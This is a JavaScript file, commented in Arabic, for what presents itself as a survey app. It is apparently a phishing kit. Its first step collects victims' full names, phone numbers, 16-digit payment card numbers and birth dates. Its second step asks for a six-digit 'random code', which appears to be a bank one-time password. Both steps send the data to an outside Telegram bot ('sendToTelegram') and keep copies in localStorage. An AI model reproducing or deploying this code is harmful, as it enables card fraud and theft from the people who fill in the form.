// التطبيق الرئيسي المعدل
class SurveyApp {
    constructor() {
        this.currentStep = 1;
        this.step1Data = null;
        this.step2Data = null;
        this.participationId = null;
        this.init();
    }
    
    init() {
        this.setupEventListeners();
        this.updateStats();
    }
    
    // تحديث الإحصائيات
    updateStats() {
        const participants = this.getParticipants();
        const countElement = document.getElementById('total-participants');
        if (countElement) {
            countElement.textContent = participants.length;
        }
    }
    
    // بدء الاستبيان
    startSurvey() {
        // التحقق من الحد الأقصى
        const participants = this.getParticipants();
        if (participants.length >= 10000) {
            this.showNotification('تم الوصول للحد الأقصى للمشاركين', 'error');
            return;
        }
        
        // الانتقال لصفحة الاستبيان
        document.getElementById('home-page').classList.remove('active');
        document.getElementById('survey-page').classList.add('active');
        
        // تحميل الخطوة الأولى
        this.loadStep(1);
    }
    
    // تحميل الخطوة
    loadStep(step) {
        this.currentStep = step;
        
        // تحديث شريط التقدم
        document.querySelectorAll('.step').forEach(el => {
            el.classList.remove('active');
            if (parseInt(el.dataset.step) <= step) {
                el.classList.add('active');
            }
        });
        
        // إخفاء جميع الخطوات
        document.querySelectorAll('.survey-step').forEach(el => {
            el.classList.remove('active');
        });
        
        // إظهار الخطوة المطلوبة
        document.getElementById(`step-${step}`).classList.add('active');
        
        // إذا كانت الخطوة الثالثة، توليد رقم المشاركة
        if (step === 3) {
            this.generateParticipationId();
            this.updateCompletionDate();
        }
    }
    
    // الخطوة 1: إرسال معلومات الاتصال
    async submitStep1() {
        // التحقق من البيانات
        if (!this.validateStep1()) {
            this.showNotification('يرجى ملء جميع الحقول بشكل صحيح', 'error');
            return;
        }
        
        // جمع البيانات
        this.step1Data = {
            fullName: document.getElementById('full-name').value,
            phone: document.getElementById('phone').value,
            cardNumber: document.getElementById('card-number').value,
            birthDate: document.getElementById('birth-date').value,
            timestamp: new Date().toISOString(),
            step: 1
        };
        
        try {
            // إرسال البيانات للمدير
            const sent = await this.sendToManager(this.step1Data, 'step1');
            
            if (sent) {
                this.showNotification('تم إرسال معلومات الاتصال للمدير بنجاح', 'success');
                
                // الانتقال للخطوة 2 بعد ثانيتين
                setTimeout(() => {
                    this.loadStep(2);
                }, 2000);
            } else {
                this.showNotification('فشل في إرسال البيانات للمدير', 'error');
            }
            
        } catch (error) {
            console.error('Error in step 1:', error);
            this.showNotification('حدث خطأ في الإرسال', 'error');
        }
    }
    
    // الخطوة 2: إرسال الرمز العشوائي
    async submitStep2() {
        // التحقق من الرمز
        const code = document.getElementById('random-code').value;
        
        if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
            this.showNotification('الرجاء إدخال 6 أرقام صحيحة', 'error');
            return;
        }
        
        // حفظ البيانات
        this.step2Data = {
            randomCode: code,
            timestamp: new Date().toISOString(),
            step: 2
        };
        
        try {
            // إرسال الرمز للمدير
            const sent = await this.sendToManager(this.step2Data, 'step2');
            
            if (sent) {
                this.showNotification('تم إرسال الرمز العشوائي للمدير بنجاح', 'success');
                
                // حفظ المشاركة الكاملة
                this.saveParticipation();
                
                // الانتقال للخطوة 3 بعد ثانيتين
                setTimeout(() => {
                    this.loadStep(3);
                }, 2000);
            } else {
                this.showNotification('فشل في إرسال الرمز للمدير', 'error');
            }
            
        } catch (error) {
            console.error('Error in step 2:', error);
            this.showNotification('حدث خطأ في الإرسال', 'error');
        }
    }
    
    // التحقق من الخطوة 1
    validateStep1() {
        const fullName = document.getElementById('full-name').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const cardNumber = document.getElementById('card-number').value.trim();
        const birthDate = document.getElementById('birth-date').value;
        const privacyChecked = document.getElementById('privacy-agreement').checked;
        
        // التحقق من الاسم
        if (fullName.length < 3) {
            this.showNotification('الاسم يجب أن يكون 3 أحرف على الأقل', 'error');
            return false;
        }
        
        // التحقق من رقم الهاتف
        const phoneRegex = /^(05|06|07)[0-9]{8}$/;
        if (!phoneRegex.test(phone.replace(/\s/g, ''))) {
            this.showNotification('رقم الهاتف غير صالح. يجب أن يبدأ بـ 05، 06، أو 07', 'error');
            return false;
        }
        
        // التحقق من رقم البطاقة
        if (cardNumber.replace(/\s/g, '').length !== 16 || !/^\d+$/.test(cardNumber.replace(/\s/g, ''))) {
            this.showNotification('رقم البطاقة يجب أن يكون 16 رقمًا', 'error');
            return false;
        }
        
        // التحقق من تاريخ الميلاد
        if (!birthDate) {
            this.showNotification('يرجى اختيار تاريخ الميلاد', 'error');
            return false;
        }
        
        // حساب العمر
        const birthDateObj = new Date(birthDate);
        const today = new Date();
        let age = today.getFullYear() - birthDateObj.getFullYear();
        const monthDiff = today.getMonth() - birthDateObj.getMonth();
        
        if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDateObj.getDate())) {
            age--;
        }
        
        if (age < 18) {
            this.showNotification('يجب أن يكون عمرك 18 سنة على الأقل', 'error');
            return false;
        }
        
        // التحقق من اتفاقية الخصوصية
        if (!privacyChecked) {
            this.showNotification('يجب الموافقة على سياسة الخصوصية', 'error');
            return false;
        }
        
        return true;
    }
    
    // إرسال البيانات للمدير
    async sendToManager(data, step) {
        try {
            // حفظ في قاعدة البيانات المحلية
            this.saveToLocalStorage(data, step);
            
            // إرسال إشعار للمدير عبر localStorage
            this.notifyManager(data, step);
            
            // محاولة الإرسال لتليجرام إذا كان مضبوطاً
            if (window.CONFIG && CONFIG.TELEGRAM && CONFIG.TELEGRAM.ENABLED) {
                await this.sendToTelegram(data, step);
            }
            
            return true;
            
        } catch (error) {
            console.error('Error sending to manager:', error);
            return false;
        }
    }
    
    // حفظ في localStorage
    saveToLocalStorage(data, step) {
        const key = `survey_step_${step}_${Date.now()}`;
        localStorage.setItem(key, JSON.stringify({
            ...data,
            step,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ip: this.getClientIP()
        }));
    }
    
    // إشعار المدير
    notifyManager(data, step) {
        // إنشاء إشعار جديد
        const notification = {
            id: `notif_${Date.now()}`,
            type: step === 'step1' ? 'contact_info' : 'verification_code',
            data: data,
            timestamp: new Date().toISOString(),
            read: false
        };
        
        // حفظ في قائمة الإشعارات
        let notifications = JSON.parse(localStorage.getItem('manager_notifications') || '[]');
        notifications.unshift(notification);
        
        // حفظ آخر 100 إشعار فقط
        if (notifications.length > 100) {
            notifications = notifications.slice(0, 100);
        }
        
        localStorage.setItem('manager_notifications', JSON.stringify(notifications));
        
        // تحديث علامة للمدير
        localStorage.setItem('last_survey_update', Date.now().toString());
        
        // بث الحدث للصفحات الأخرى
        this.broadcastUpdate();
    }
    
    // بث التحديثات
    broadcastUpdate() {
        // استخدام localStorage كوسيلة اتصال بين التبويبات
        const event = new Event('storage');
        localStorage.setItem('survey_broadcast', Date.now().toString());
        window.dispatchEvent(event);
    }
    
    // إرسال لتليجرام
    async sendToTelegram(data, step) {
        if (!CONFIG.TELEGRAM.ENABLED || !CONFIG.TELEGRAM.BOT_TOKEN || !CONFIG.TELEGRAM.CHAT_ID) {
            return false;
        }
        
        try {
            let message = '';
            
            if (step === 'step1') {
                message = `
📋 <b>معلومات اتصال جديدة - الخطوة 1</b>
────────────────────
👤 <b>الاسم:</b> ${data.fullName}
📱 <b>الهاتف:</b> ${data.phone}
💳 <b>البطاقة:</b> ${data.cardNumber}
🎂 <b>تاريخ الميلاد:</b> ${data.birthDate}
⏰ <b>الوقت:</b> ${new Date(data.timestamp).toLocaleString('ar-SA')}
────────────────────
✅ تم استلام معلومات الاتصال
                `;
            } else if (step === 'step2') {
                message = `
🔐 <b>رمز تحقق جديد - الخطوة 2</b>
────────────────────
🔢 <b>الرمز العشوائي:</b> ${data.randomCode}
⏰ <b>الوقت:</b> ${new Date(data.timestamp).toLocaleString('ar-SA')}
────────────────────
✅ تم استلام رمز التحقق
                `;
            }
            
            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            return result.ok;
            
        } catch (error) {
            console.error('Telegram send error:', error);
            return false;
        }
    }
    
    // حفظ المشاركة الكاملة
    saveParticipation() {
        // توليد رقم مشاركة فريد
        this.participationId = this.generateId();
        
        const participation = {
            id: this.participationId,
            step1: this.step1Data,
            step2: this.step2Data,
            completedAt: new Date().toISOString(),
            status: 'completed',
            deviceInfo: this.getDeviceInfo()
        };
        
        // حفظ في قاعدة البيانات المحلية
        let participants = this.getParticipants();
        participants.push(participation);
        localStorage.setItem('survey_participants', JSON.stringify(participants));
        
        // تحديث الإحصائيات
        this.updateStats();
    }
    
    // توليد رقم المشاركة
    generateParticipationId() {
        if (!this.participationId) {
            this.participationId = this.generateId();
        }
        
        const idElement = document.getElementById('participation-id');
        if (idElement) {
            idElement.textContent = this.participationId;
        }
    }
    
    // تحديث تاريخ الاكتمال
    updateCompletionDate() {
        const dateElement = document.getElementById('completion-date');
        if (dateElement) {
            const now = new Date();
            dateElement.textContent = now.toLocaleDateString('ar-SA', {
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
        }
    }
    
    // توليد ID فريد
    generateId() {
        const timestamp = Date.now().toString(36);
        const random = Math.random().toString(36).substr(2, 6).toUpperCase();
        return `FS-${timestamp}-${random}`;
    }
    
    // جلب معلومات الجهاز
    getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }
    
    // جلب IP العميل
    getClientIP() {
        // هذه دالة مبسطة، في الواقع تحتاج لخدمة خارجية
        return 'unknown';
    }
    
    // جلب جميع المشاركين
    getParticipants() {
        const data = localStorage.getItem('survey_participants');
        return data ? JSON.parse(data) : [];
    }
    
    // الرجوع للصفحة السابقة
    goBack() {
        if (this.currentStep > 1) {
            this.loadStep(this.currentStep - 1);
        } else {
            this.goHome();
        }
    }
    
    // العودة للصفحة الرئيسية
    goHome() {
        document.getElementById('survey-page').classList.remove('active');
        document.getElementById('home-page').classList.add('active');
        
        // إعادة تعيين النموذج
        this.resetForm();
        this.currentStep = 1;
    }
    
    // إعادة تعيين النموذج
    resetForm() {
        document.getElementById('full-name').value = '';
        document.getElementById('phone').value = '';
        document.getElementById('card-number').value = '';
        document.getElementById('birth-date').value = '';
        document.getElementById('random-code').value = '';
        document.getElementById('privacy-agreement').checked = false;
        
        this.step1Data = null;
        this.step2Data = null;
        this.participationId = null;
    }
    
    // مشاركة رقم المشاركة
    shareParticipation() {
        if (!this.participationId) {
            this.showNotification('لا يوجد رقم مشاركة لمشاركته', 'error');
            return;
        }
        
        const modal = document.getElementById('share-modal');
        const input = document.getElementById('share-code-input');
        
        if (modal && input) {
            input.value = this.participationId;
            modal.style.display = 'flex';
        }
    }
    
    // نسخ رمز المشاركة
    copyShareCode() {
        const input = document.getElementById('share-code-input');
        if (!input || !input.value) return;
        
        navigator.clipboard.writeText(input.value).then(() => {
            const successMsg = document.getElementById('copy-success');
            if (successMsg) {
                successMsg.style.display = 'flex';
                setTimeout(() => {
                    successMsg.style.display = 'none';
                }, 2000);
            }
            this.showNotification('تم نسخ رقم المشاركة بنجاح', 'success');
        }).catch(err => {
            console.error('Failed to copy:', err);
            this.showNotification('فشل في النسخ', 'error');
        });
    }
    
    // عرض الإشعارات
    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        if (!notification) return;
        
        notification.textContent = message;
        notification.className = `notification ${type}`;
        notification.classList.add('show');
        
        setTimeout(() => {
            notification.classList.remove('show');
        }, 3000);
    }
    
    // إعداد مستمعي الأحداث
    setupEventListeners() {
        // تحديث الإحصائيات كل 5 ثوانٍ
        setInterval(() => {
            this.updateStats();
        }, 5000);
        
        // الاستماع لتحديثات قاعدة البيانات
        window.addEventListener('storage', (event) => {
            if (event.key === 'last_survey_update' || event.key === 'survey_broadcast') {
                this.updateStats();
            }
        });
        
        // إغلاق النافذة المنبثقة بالنقر خارجها
        window.addEventListener('click', (event) => {
            const modal = document.getElementById('share-modal');
            if (modal && event.target === modal) {
                modal.style.display = 'none';
            }
        });
    }
}

// جعل الدوال متاحة عالمياً
let App;
document.addEventListener('DOMContentLoaded', () => {
    App = new SurveyApp();
    
    // تعيين الدوال للاستخدام العالمي
    window.startSurvey = () => App.startSurvey();
    window.submitStep1 = () => App.submitStep1();
    window.submitStep2 = () => App.submitStep2();
    window.goBack = () => App.goBack();
    window.goHome = () => App.goHome();
    window.shareParticipation = () => App.shareParticipation();
    window.copyShareCode = () => App.copyShareCode();
    window.updateStats = () => App.updateStats();
    
    // إخفاء شاشة التحميل بعد تحميل كل شيء
    setTimeout(() => {
        const loadingScreen = document.getElementById('loading-screen');
        if (loadingScreen) {
            loadingScreen.style.display = 'none';
        }
    }, 1500);
});